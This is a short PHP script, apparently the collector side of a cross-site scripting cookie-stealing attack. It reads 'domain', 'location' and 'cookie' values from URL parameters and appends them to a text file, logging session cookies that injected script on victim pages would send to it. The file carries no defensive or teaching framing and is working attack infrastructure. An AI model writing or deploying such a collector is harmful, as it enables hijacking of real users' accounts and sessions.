<?php
$file = 'info.txt';
// Open the file to get existing content
$current = file_get_contents($file);
// Append a new person to the file
$current .= "Domain: " . htmlspecialchars($_GET["domain"]) . " Location: " . htmlspecialchars($_GET["location"]). " Cookie: " . htmlspecialchars($_GET["cookie"]) . PHP_EOL;
// Write the contents back to the file
file_put_contents($file, $current);
?>